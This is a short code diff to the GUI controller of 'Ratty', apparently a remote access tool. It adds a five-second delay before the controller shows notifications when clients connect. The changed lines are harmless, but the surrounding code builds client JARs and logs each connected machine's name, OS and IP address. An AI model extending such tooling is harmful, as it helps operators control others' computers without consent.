@@ -61,6 +61,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
 	
+	private long startTime;
+	
 	private static final String BUILDER_DATA_REPLACEMENT = "data";
 	private static final String BUILDER_DATA_REPLACEMENT_FORMAT = "%s" + System.lineSeparator() + "%s";
 	private static final String BUILDER_MANIFEST_REPLACEMENT = "META-INF/MANIFEST.MF";
@@ -122,6 +124,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
 	private static final long PING_INTERVAL = 3000;
+	private static final long NOTIFICATION_DELAY = 5000;
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
 	
@@ -144,6 +147,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		});
 		
 		clients = new HashMap<ActiveConnection, ServerClient>();
+		startTime = System.currentTimeMillis();
 		
 		pingThread.setDaemon(true);
 		pingThread.start();
@@ -706,13 +710,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String version = packet.getVersion();
 		final String address = client.getAddress();
 		final ImageIcon icon = getFlagIcon(address);
+		final boolean shouldNotify = System.currentTimeMillis() - startTime > NOTIFICATION_DELAY;
 		
 		client.logIn(name, os, version, icon);
 		client.addListener(this);
 		
 		gui.addClient(client);
 		
-		if (true) {
+		if (shouldNotify) {
 			final Notification notification = new Notification(name + " " + address, icon);
 			
 			notification.trigger();
